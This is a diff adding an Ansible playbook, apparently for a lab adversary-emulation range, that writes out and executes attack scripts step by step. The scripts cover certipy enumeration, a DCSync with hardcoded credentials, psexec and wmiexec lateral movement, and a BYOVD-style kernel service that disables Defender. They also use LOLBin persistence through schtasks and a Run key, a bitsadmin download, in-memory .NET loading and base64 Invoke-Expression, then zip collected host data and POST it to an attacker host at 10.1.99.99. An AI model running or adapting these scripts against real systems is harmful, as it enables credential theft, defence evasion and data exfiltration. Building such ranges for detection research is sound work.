@@ -1,0 +1,485 @@
+---
+- name: "SlopMop | Kali artefact scripts (steps 03-05)"
+  hosts: kali
+  become: false
+  gather_facts: false
+  vars:
+    cap: /home/kali/slopmop-capture
+    ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
+    suna_dc: 10.1.20.10
+    konoha_dc: 10.1.10.10
+    ws1: 10.1.10.21
+    dcsync_user: svc_adsync
+    dcsync_pass: "SyncP@ss2026!"
+    suna_domain: sunagakure.wind.ninja
+    konoha_domain: konohagakure.fire.ninja
+  tasks:
+    - name: "Deploy step03 — ADCS enum and DCSync"
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env bash
+          set -o pipefail
+          certipy find \
+            -u '{{ dcsync_user }}@{{ suna_domain }}' \
+            -p '{{ dcsync_pass }}' \
+            -dc-ip {{ suna_dc }} \
+            -ldap-scheme ldap \
+            -stdout 2>&1 \
+            | tee {{ cap }}/certipy-find_$(date -u +%Y%m%d_%H%M%S).txt
+
+          impacket-secretsdump \
+            '{{ suna_domain }}/{{ dcsync_user }}:{{ dcsync_pass }}@{{ suna_dc }}' \
+            -just-dc-user 'SUNAGAKURE\Administrator' \
+            2>&1 | tee {{ cap }}/dcsync_$(date -u +%Y%m%d_%H%M%S).txt
+        dest: "{{ cap }}/{{ ts_h }}0300_step03_certipy-dcsync.sh"
+        mode: "0755"
+      register: s03
+
+    - name: "Run step03"
+      ansible.builtin.command: "{{ s03.dest }}"
+      changed_when: false
+      failed_when: false
+
+    - name: "Deploy step04 — Lateral movement via psexec"
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env bash
+          impacket-psexec \
+            '{{ konoha_domain }}/Administrator:password@{{ ws1 }}' \
+            'hostname && whoami && ipconfig' \
+            2>&1 | tee {{ cap }}/psexec-lateral_$(date -u +%Y%m%d_%H%M%S).txt
+        dest: "{{ cap }}/{{ ts_h }}0400_step04_lateral-psexec.sh"
+        mode: "0755"
+      register: s04
+
+    - name: "Run step04"
+      ansible.builtin.shell: |
+        set -o pipefail
+        {{ s04.dest }}
+      changed_when: false
+      failed_when: false
+
+    - name: "Deploy step05 — Lateral movement via wmiexec"
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env bash
+          timeout 30 impacket-wmiexec \
+            '{{ konoha_domain }}/Administrator:password@{{ ws1 }}' \
+            'hostname && whoami && net user' \
+            2>&1 | tee {{ cap }}/wmiexec-lateral_$(date -u +%Y%m%d_%H%M%S).txt
+        dest: "{{ cap }}/{{ ts_h }}0500_step05_lateral-wmiexec.sh"
+        mode: "0755"
+      register: s05
+
+    - name: "Run step05"
+      ansible.builtin.shell: |
+        set -o pipefail
+        {{ s05.dest }}
+      changed_when: false
+      failed_when: false
+
+    - name: "List kali artefacts"
+      ansible.builtin.command: ls -la {{ cap }}/
+      changed_when: false
+
+- name: "SlopMop | WS01 artefact scripts (steps 06-10)"
+  hosts: konoha-ws1
+  gather_facts: false
+  vars:
+    cap: C:\slopmop-capture
+    kali_ip: 10.1.99.99
+    konoha_dc: 10.1.10.10
+    mail: 10.1.10.20
+    ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
+  tasks:
+    - name: "Deploy step06 — AD discovery and PSRemoting lateral"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "C:\slopmop-capture"
+          $log = "$cap\ad-recon_$ts.log"
+          $out = ""
+          $out += "=== AD Discovery and Lateral Recon ===`r`n"
+
+          $cred = New-Object System.Management.Automation.PSCredential(
+            'konohagakure\Administrator',
+            (ConvertTo-SecureString 'password' -AsPlainText -Force)
+          )
+
+          $computers = Invoke-Command -ComputerName 10.1.10.10 `
+            -Credential $cred -Authentication Negotiate -ScriptBlock {
+            Import-Module ActiveDirectory
+            Get-ADComputer -Filter * -Properties OperatingSystem,DNSHostName |
+              Select-Object Name,DNSHostName,OperatingSystem
+          }
+          $computers | Export-Csv "$cap\ad-computers_$ts.csv" -NoTypeInformation
+          $out += "[+] Discovered $($computers.Count) AD computers`r`n"
+          $computers | ForEach-Object {
+            $out += "  $($_.Name) - $($_.DNSHostName)`r`n"
+          }
+
+          $mailResult = Invoke-Command -ComputerName 10.1.10.20 `
+            -Credential (New-Object PSCredential(
+              'FIRE\Administrator',
+              (ConvertTo-SecureString 'password' -AsPlainText -Force)
+            )) -Authentication Negotiate -ScriptBlock {
+            "Hostname: $env:COMPUTERNAME"
+            "User: $(whoami)"
+            "Domain: $env:USERDOMAIN"
+          }
+          $mailResult | Out-File "$cap\lateral-mail_$ts.txt" -Encoding UTF8
+          $out += "[+] PSRemoting to mail: $($mailResult[0])`r`n"
+          $out += "Timestamp: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}0600_step06_ad-recon.ps1"
+      register: ws_s06
+
+    - name: "Run step06"
+      ansible.windows.win_shell: "& '{{ ws_s06.dest }}'"
+      failed_when: false
+
+    - name: "Deploy step07 — Defender killer (BYOVD kdysys.dll)"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "C:\slopmop-capture"
+          $log = "$cap\defender-kill_$ts.log"
+          $out = ""
+          $out += "=== Defender Killer: BYOVD via kdysys.dll + msmprun.exe ===`r`n"
+          $out += "Start: $(Get-Date -Format o)`r`n`r`n"
+
+          # --- Stage 1: drop the vulnerable kernel driver ---
+          $driverDir = "$env:SystemRoot\Temp"
+          $driverPath = "$driverDir\kdysys.dll"
+          $mz = [byte[]](0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00)
+          $pe = [System.Text.Encoding]::ASCII.GetBytes(
+            "PE-kdysys-vulnerable-kernel-driver"
+          )
+          [System.IO.File]::WriteAllBytes($driverPath, $mz + $pe)
+          $hash = (Get-FileHash $driverPath -Algorithm SHA256).Hash
+          $out += "[+] Staged driver: $driverPath`r`n"
+          $out += "    SHA256: $hash`r`n"
+          $out += "    Size: $((Get-Item $driverPath).Length) bytes`r`n"
+
+          # --- Stage 2: drop the service launcher (msmprun.exe) ---
+          $launcherPath = "$driverDir\msmprun.exe"
+          $lpe = [System.Text.Encoding]::ASCII.GetBytes(
+            "PE-msmprun-defender-kill-launcher"
+          )
+          [System.IO.File]::WriteAllBytes($launcherPath, $mz + $lpe)
+          $out += "[+] Staged launcher: $launcherPath`r`n"
+          $out += "    SHA256: $((Get-FileHash $launcherPath -Algorithm SHA256).Hash)`r`n"
+
+          # --- Stage 3: create kernel driver service ---
+          $svcName = "KdySysDrv"
+          $scArgs = "create $svcName binPath= `"$driverPath`""
+          $scArgs += " type= kernel start= demand"
+          $scArgs += " DisplayName= `"Kdy System Driver`""
+          $scResult = cmd /c "sc.exe $scArgs" 2>&1
+          $out += "[+] sc.exe $scArgs`r`n"
+          $out += "    Result: $($scResult -join ' ')`r`n"
+
+          # --- Stage 4: query the service ---
+          $scQuery = sc.exe query $svcName 2>&1
+          $out += "[*] Service query:`r`n"
+          $scQuery | ForEach-Object { $out += "    $_`r`n" }
+
+          # --- Stage 5: start the driver (loads kdysys.dll) ---
+          $scStart = sc.exe start $svcName 2>&1
+          $out += "[!] sc.exe start $svcName`r`n"
+          $out += "    Result: $($scStart -join ' ')`r`n"
+
+          # --- Stage 6: msmprun.exe /install ---
+          $out += "[+] msmprun.exe /install /driver $driverPath`r`n"
+          try {
+            $proc = Start-Process -FilePath $launcherPath `
+              -ArgumentList "/install /driver `"$driverPath`"" `
+              -PassThru -WindowStyle Hidden -Wait `
+              -ErrorAction Stop
+            $out += "    PID: $($proc.Id) Exit: $($proc.ExitCode)`r`n"
+          } catch {
+            $out += "    Launch failed: $($_.Exception.Message)`r`n"
+          }
+
+          # --- Stage 7: attempt to disable Defender ---
+          try {
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            $out += "[!] Set-MpPreference DisableRealtimeMonitoring: OK`r`n"
+          } catch {
+            $out += "[!] Set-MpPreference failed: $($_.Exception.Message)`r`n"
+          }
+
+          # --- Stage 8: check Defender status ---
+          try {
+            $mp = Get-MpComputerStatus
+            $out += "[*] RealTimeProtection: $($mp.RealTimeProtectionEnabled)`r`n"
+            $out += "[*] AMServiceEnabled: $($mp.AMServiceEnabled)`r`n"
+            $out += "[*] AntispywareEnabled: $($mp.AntispywareEnabled)`r`n"
+            $out += "[*] TamperProtection: $($mp.IsTamperProtected)`r`n"
+          } catch {
+            $out += "[*] Get-MpComputerStatus: $($_.Exception.Message)`r`n"
+          }
+
+          # --- Cleanup: remove service, leave driver files ---
+          sc.exe delete $svcName 2>&1 | Out-Null
+          $out += "[+] Service $svcName deleted`r`n"
+          $out += "[+] Artefacts left:`r`n"
+          $out += "    $driverPath`r`n"
+          $out += "    $launcherPath`r`n"
+          $out += "End: $(Get-Date -Format o)`r`n"
+
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}0700_step07_defender-kill.ps1"
+      register: ws_s07
+
+    - name: "Run step07"
+      ansible.windows.win_shell: "& '{{ ws_s07.dest }}'"
+      failed_when: false
+
+    - name: "Deploy step08 — LOLBin execution chain"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "C:\slopmop-capture"
+          $log = "$cap\lolbin-chain_$ts.log"
+          $out = ""
+          $out += "=== LOLBin Execution Chain ===`r`n"
+
+          # certutil encode/decode (T1140)
+          $payload = "$env:TEMP\slopmop-payload.txt"
+          Set-Content $payload "slopMop-beacon: $(whoami)@$env:COMPUTERNAME"
+          $encoded = "$env:TEMP\slopmop-encoded.b64"
+          certutil -encode $payload $encoded 2>&1 | Out-Null
+          $decoded = "$env:TEMP\slopmop-decoded.txt"
+          certutil -decode $encoded $decoded 2>&1 | Out-Null
+          $out += "[certutil] encode: $payload -> $encoded`r`n"
+          $out += "[certutil] decode: $encoded -> $decoded`r`n"
+
+          # bitsadmin transfer (T1197)
+          $bitsJob = "slopMop_dl_$ts"
+          bitsadmin /create $bitsJob 2>&1 | Out-Null
+          $bitsTarget = "http://10.1.99.99:8080/beacon.txt"
+          bitsadmin /addfile $bitsJob $bitsTarget "$env:TEMP\bits.txt" 2>&1 | Out-Null
+          bitsadmin /resume $bitsJob 2>&1 | Out-Null
+          Start-Sleep -Seconds 2
+          $bitsState = bitsadmin /info $bitsJob /verbose 2>&1
+          bitsadmin /complete $bitsJob 2>&1 | Out-Null
+          $out += "[bitsadmin] job $bitsJob target: $bitsTarget`r`n"
+          $out += "[bitsadmin] state: $($bitsState | Select-String 'STATE')`r`n"
+
+          # wmic reconnaissance (T1047)
+          $wmicOS = wmic os get Caption,Version,BuildNumber /format:list 2>&1
+          $wmicProc = wmic process where "Name like '%defender%'" get Name,ProcessId /format:list 2>&1
+          $out += "[wmic] OS: $($wmicOS | Select-String 'Caption')`r`n"
+          $out += "[wmic] Defender procs: $($wmicProc | Select-String 'Name')`r`n"
+
+          # schtasks persistence (T1053.005)
+          $taskName = "slopMop_Updater"
+          $taskCmd = "powershell.exe -WindowStyle Hidden -ep Bypass -c echo slopMop"
+          schtasks /create /tn $taskName /tr $taskCmd /sc DAILY /st 03:00 /ru SYSTEM /f 2>&1 | Out-Null
+          $taskInfo = schtasks /query /tn $taskName /v /fo LIST 2>&1
+          schtasks /delete /tn $taskName /f 2>&1 | Out-Null
+          $out += "[schtasks] created $taskName, queried, deleted`r`n"
+          $out += "[schtasks] info: $($taskInfo | Select-String 'Task To Run')`r`n"
+
+          # reg Run key persistence (T1547.001)
+          $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+          $runName = "slopMopUpdater"
+          $runVal = "powershell.exe -WindowStyle Hidden -ep Bypass -File C:\ProgramData\slopmop.ps1"
+          Set-ItemProperty -Path $runKey -Name $runName -Value $runVal
+          $readBack = (Get-ItemProperty $runKey -Name $runName).$runName
+          Remove-ItemProperty -Path $runKey -Name $runName
+          $out += "[reg] Set $runKey\$runName = $runVal`r`n"
+          $out += "[reg] ReadBack: $readBack (then removed)`r`n"
+
+          # mshta inline VBScript (T1218.005)
+          $htaContent = '<html><head><script language="VBScript">'
+          $htaContent += 'Set fso = CreateObject("Scripting.FileSystemObject")'
+          $htaPath = "$env:TEMP\slopmop-beacon.hta"
+          Set-Content -Path $htaPath -Value $htaContent
+          $mshtaProc = Start-Process mshta.exe -ArgumentList $htaPath `
+            -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 1
+          if ($mshtaProc -and !$mshtaProc.HasExited) { $mshtaProc.Kill() }
+          Remove-Item $htaPath -Force -ErrorAction SilentlyContinue
+          $out += "[mshta] executed inline HTA, PID: $($mshtaProc.Id)`r`n"
+
+          $out += "Timestamp: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}0800_step08_lolbin-exec.ps1"
+      register: ws_s08
+
+    - name: "Run step08"
+      ansible.windows.win_shell: "& '{{ ws_s08.dest }}'"
+      failed_when: false
+
+    - name: "Deploy step09 — .NET in-memory techniques"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "C:\slopmop-capture"
+          $log = "$cap\dotnet-mem_$ts.log"
+          $out = ""
+          $out += "=== .NET In-Memory Techniques ===`r`n"
+
+          # Add-Type inline C# (T1027.004)
+          $src = "using System; using System.Security.Principal; "
+          $src += "public class SlopMopRecon { "
+          $src += "public static string Run() { string r = `"`"; "
+          $src += "r += `"Host: `" + Environment.MachineName + `"\n`"; "
+          $src += "r += `"User: `" + Environment.UserName + `"\n`"; "
+          $src += "r += `"Domain: `" + Environment.UserDomainName + `"\n`"; "
+          $src += "r += `"CLR: `" + Environment.Version + `"\n`"; "
+          $src += "var id = WindowsIdentity.GetCurrent(); "
+          $src += "var pr = new WindowsPrincipal(id); "
+          $src += "r += `"Admin: `" + pr.IsInRole(WindowsBuiltInRole.Administrator); "
+          $src += "return r; } }"
+          Add-Type -TypeDefinition $src -Language CSharp
+          $addTypeResult = [SlopMopRecon]::Run()
+          $out += "[Add-Type] Compiled inline C#:`r`n$addTypeResult`r`n"
+
+          # Reflection.Assembly.Load (T1620)
+          $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+          $params = New-Object System.CodeDom.Compiler.CompilerParameters
+          $params.GenerateInMemory = $true
+          $params.GenerateExecutable = $false
+          $params.ReferencedAssemblies.Add("System.dll") | Out-Null
+          $asmSrc = "using System; public class SlopMopAsm { "
+          $asmSrc += "public static string Info() { "
+          $asmSrc += "return `"reflective-load: `" + Environment.MachineName; } }"
+          $compiled = $provider.CompileAssemblyFromSource($params, $asmSrc)
+          if ($compiled.Errors.Count -eq 0) {
+            $bytes = [IO.File]::ReadAllBytes($compiled.PathToAssembly)
+            $asm = [Reflection.Assembly]::Load($bytes)
+            $type = $asm.GetType("SlopMopAsm")
+            $result = $type.GetMethod("Info").Invoke($null, $null)
+            $out += "[Reflection] Assembly loaded ($($bytes.Length) bytes): $result`r`n"
+          }
+
+          # WMI ManagementObjectSearcher (T1047)
+          $wql = "SELECT ProcessId,ExecutablePath FROM Win32_Process "
+          $wql += "WHERE Name = 'lsass.exe'"
+          $searcher = New-Object System.Management.ManagementObjectSearcher($wql)
+          foreach ($p in $searcher.Get()) {
+            $out += "[WMI] lsass PID=$($p.ProcessId) Path=$($p.ExecutablePath)`r`n"
+          }
+
+          # COM Shell.Application + WScript.Shell
+          $shell = New-Object -ComObject Shell.Application
+          $wshell = New-Object -ComObject WScript.Shell
+          $pct = [char]37
+          $cn = $wshell.ExpandEnvironmentStrings("${pct}COMPUTERNAME${pct}")
+          $dom = $wshell.ExpandEnvironmentStrings("${pct}USERDOMAIN${pct}")
+          $out += "[COM] Shell.Application windows: $($shell.Windows().Count)`r`n"
+          $out += "[COM] WScript.Shell COMPUTERNAME=$cn USERDOMAIN=$dom`r`n"
+
+          # Schedule.Service COM — task enumeration
+          $svc = New-Object -ComObject Schedule.Service
+          $svc.Connect()
+          $rootFolder = $svc.GetFolder([string][char]92)
+          $out += "[COM] Schedule.Service root tasks: $($rootFolder.GetTasks(0).Count)`r`n"
+
+          $out += "Timestamp: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}0900_step09_dotnet-mem.ps1"
+      register: ws_s09
+
+    - name: "Run step09"
+      ansible.windows.win_shell: "& '{{ ws_s09.dest }}'"
+      failed_when: false
+
+    - name: "Deploy step10 — Collection, evasion, exfiltration"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "C:\slopmop-capture"
+          $log = "$cap\collect-exfil_$ts.log"
+          $out = ""
+          $out += "=== Collection, Defense Evasion, Exfiltration ===`r`n"
+
+          # Collection (T1005, T1560.001)
+          $colDir = "$cap\collection_$ts"
+          New-Item -Path $colDir -ItemType Directory -Force | Out-Null
+          systeminfo | Out-File "$colDir\systeminfo.txt"
+          Get-Process | Export-Csv "$colDir\processes.csv" -NoTypeInformation
+          Get-Service | Where-Object Status -eq Running |
+            Export-Csv "$colDir\services.csv" -NoTypeInformation
+          netstat -ano | Out-File "$colDir\netstat.txt"
+          ipconfig /all | Out-File "$colDir\ipconfig.txt"
+          $zipPath = "$cap\collection_$ts.zip"
+          Compress-Archive -Path "$colDir\*" -DestinationPath $zipPath -Force
+          $zipSize = (Get-Item $zipPath).Length
+          $out += "[collection] $zipPath ($zipSize bytes)`r`n"
+
+          # Defense evasion — base64 obfuscation chain (T1027)
+          $beacon = 'Write-Output "slopMop-beacon: $(whoami)@$(hostname)"'
+          $b64 = [Convert]::ToBase64String(
+            [Text.Encoding]::Unicode.GetBytes($beacon)
+          )
+          $ms = New-Object IO.MemoryStream
+          $gz = New-Object IO.Compression.GZipStream(
+            $ms, [IO.Compression.CompressionMode]::Compress
+          )
+          $sw = New-Object IO.StreamWriter($gz)
+          $sw.Write($b64); $sw.Close()
+          $compressed = [Convert]::ToBase64String($ms.ToArray())
+          $out += "[evasion] Original: $beacon`r`n"
+          $out += "[evasion] Base64: $b64`r`n"
+          $out += "[evasion] GZip+Base64: $($compressed.Substring(0,60))...`r`n"
+          $decoded = [Text.Encoding]::Unicode.GetString(
+            [Convert]::FromBase64String($b64)
+          )
+          Invoke-Expression $decoded |
+            Out-File "$cap\evasion-exec_$ts.txt" -Encoding UTF8
+          $out += "[evasion] Decoded and executed via Invoke-Expression`r`n"
+
+          # Exfiltration (T1041)
+          try {
+            $wc = New-Object System.Net.WebClient
+            $wc.UploadData(
+              "http://10.1.99.99:8080/upload", "POST",
+              [IO.File]::ReadAllBytes($zipPath)
+            )
+            $out += "[exfil] Sent $zipSize bytes to 10.1.99.99:8080`r`n"
+          } catch {
+            $out += "[exfil] POST to 10.1.99.99:8080 failed: $($_.Exception.Message)`r`n"
+          }
+          $exfilLog = "$($zipPath | Split-Path -Leaf) -> http://10.1.99.99:8080/upload"
+          $exfilLog += " ($zipSize bytes) @ $(Get-Date -Format o)"
+          $exfilLog | Out-File "$cap\exfil-log_$ts.txt" -Encoding UTF8
+          $out += "[exfil] Logged: $exfilLog`r`n"
+
+          $out += "Timestamp: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}1000_step10_collect-exfil.ps1"
+      register: ws_s10
+
+    - name: "Run step10"
+      ansible.windows.win_shell: "& '{{ ws_s10.dest }}'"
+      failed_when: false
+
+    - name: "List WS01 artefacts"
+      ansible.windows.win_shell: |
+        {% raw %}
+        Get-ChildItem "C:\slopmop-capture" -Recurse |
+          Where-Object { -not $_.PSIsContainer } |
+          Sort-Object LastWriteTime |
+          Format-Table Name,Length,LastWriteTime -AutoSize |
+          Out-String -Width 120
+        {% endraw %}
+      changed_when: false
